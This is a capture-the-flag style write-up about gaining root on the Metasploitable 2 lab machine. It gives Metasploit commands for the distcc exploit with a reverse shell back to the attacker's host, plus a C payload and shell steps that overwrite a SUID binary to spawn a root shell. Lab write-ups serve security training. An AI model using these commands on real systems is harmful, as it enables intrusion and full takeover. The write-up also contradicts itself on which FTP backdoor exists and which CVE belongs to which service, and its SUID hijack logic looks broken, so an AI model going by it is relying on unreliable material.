
---

# 🧨 Metasploitable 2 — The Hard Way to Root 🚀👑

**Author:** Tayler Derden  
**Category:** CTF / Exploitation Lab  
**Difficulty:** 🔴 Hard  
**Tags:** `PHP-CGI`, `Nuclei`, `LinPEAS`, `Privilege Escalation`, `SUID Hijacking`, `Linux`

---

## 📘 Description

**While this machine is known for its trivial `vsftpd 2.3.4` backdoor, this write-up documents a deliberately chosen, more challenging path to simulate a scenario where common exploits might fail. Instead of taking the easy way, the focus was on deep analysis and exploiting less obvious misconfigurations.**

This challenge is based on the classic **Metasploitable 2** virtual machine.  
The goal: identify vulnerabilities through deep enumeration, gain initial access, and escalate privileges to become **root**.

While there are simpler, well-known paths on this machine, **this write-up documents a deliberate choice to explore less obvious vectors**, simulating a scenario where common exploits might fail. The path involved multiple dead ends, including a patched PHP-CGI vulnerability and a failed PwnKit exploit, ultimately leading to a successful privilege escalation by exploiting a **SUID binary misconfiguration**.

---

## 🔍 Reconnaissance

### Initial Foothold & Deep Scan

Initial enumeration quickly identifies several "low-hanging fruit" vulnerabilities, such as a **backdoored ProFTPD on port 21**. However, choosing the easy path offers little challenge. Instead, the focus was shifted to a more comprehensive analysis of the machine's entire attack surface.

A full vulnerability scan was performed using **Nuclei** to uncover less trivial entry points.

```bash
nuclei -u http://192.168.58.3
```

**Key Results from Nuclei (Ignoring the obvious FTP backdoor):**

| Port | Service     | Finding                                  | Notes                                    |
|------|-------------|------------------------------------------|------------------------------------------|
| 3632 | distcc      | **RCE via CVE-2004-2687**                | **Chosen vector for initial access**     |
| 5432 | PostgreSQL  | Default credentials (postgres:postgres)  | Excellent alternative for access/pillage |
| 6200 | ingreslock | RCE via backdoored service (CVE-2011-2523) | Another solid RCE vector                 |

---

## 🔥 Vulnerability: distcc Command Execution (RCE)

The `distcc` service, a distributed compiler, was running on port 3632 and was vulnerable to **CVE-2004-2687**, allowing unauthenticated remote code execution. This vector was selected for being a more interesting and less common entry point than the FTP backdoor.

- **Metasploit module:** `exploit/unix/misc/distcc_exec`

---

## 💣 Exploitation

### Step 1: Launch Metasploit Exploit

```bash
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.58.3
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.58.1
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/reverse_perl
msf6 exploit(unix/misc/distcc_exec) > run
```

🎉 **Result:** Reverse shell obtained as **daemon (UID 1)**.

---

## 🧠 Privilege Escalation

### Step 2: Surgical Enumeration with LinPEAS

A full LinPEAS scan was initially overwhelming. To focus the search, a targeted scan was used to find only misconfigured file permissions.

```bash
# On the victim machine
./linpeas.sh -o interesting_perms_files
```
🔎 This immediately revealed the critical vulnerability:

`You own the SUID file: /usr/bin/at`

This means the `daemon` user has write permissions on a binary that is owned by `root` and has the SUID bit set.

### Step 3: Exploit via SUID Binary Hijacking

The strategy was to replace the legitimate `/usr/bin/at` binary with a custom payload that spawns a root shell.

```bash
# 1. Back up the original binary
mv /usr/bin/at /tmp/at.bak

# 2. Create a C payload to spawn a root shell
echo '#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}' > /tmp/evil_at.c

# 3. Compile the payload and replace the original binary
gcc /tmp/evil_at.c -o /usr/bin/at

# 4. Restore the SUID bit
chmod +s /usr/bin/at

# 5. Execute the hijacked binary
/usr/bin/at
```
🔥 Boom → A new shell appeared with **root access**.

---

## 🏆 Final Outcome

✔️ Performed deep enumeration with **Nuclei**, bypassing initial dead ends.  
✔️ Exploited **distcc (CVE-2004-2687)** → gained reverse shell as `daemon`.  
✔️ Performed targeted enumeration with **LinPEAS**.  
✔️ Escalated privileges by **hijacking a writable SUID binary (`/usr/bin/at`)**.  
✔️ Achieved **ROOT**!

---

## 🔬 CIA Triad Impact

| Property        | Impact                                                                    |
|-----------------|---------------------------------------------------------------------------|
| Confidentiality | 🔴 Full disclosure of all system data, including `/etc/shadow` and user files. |
| Integrity       | 🔴 Attacker can modify any file, install backdoors, and manipulate logs.    |
| Availability    | 🔴 The system can be fully disabled or destroyed by the attacker.           |

---

## 🛡️ Mitigation

- **Patch Services:** Update or disable vulnerable services like `distcc`.
- **Principle of Least Privilege:** Run services with dedicated, unprivileged users.
- **File Integrity Monitoring:** Use tools like `AIDE` or `Tripwire` to detect unauthorized changes to critical system binaries.
- **SUID/SGID Auditing:** Regularly audit SUID/SGID files and remove permissions where they are not strictly necessary.

---

## 💡 Reflection

This lab was a masterclass in persistence and methodical problem-solving.
- It proved that while simple paths like the **ProFTPD backdoor** exist, a deeper analysis reveals a much richer and more educational attack surface.
- Reinforced the power of **targeted enumeration** over "spray and pray" tactics.
- Showcased a classic, reliable privilege escalation technique that is often more effective than complex kernel exploits.
- The path was not linear; it required adapting to failures and re-evaluating intelligence, which is the essence of a real penetration test.

🔥 This wasn't just about getting root; it was about earning it through analysis, precision, and the deliberate choice of a more challenging path.
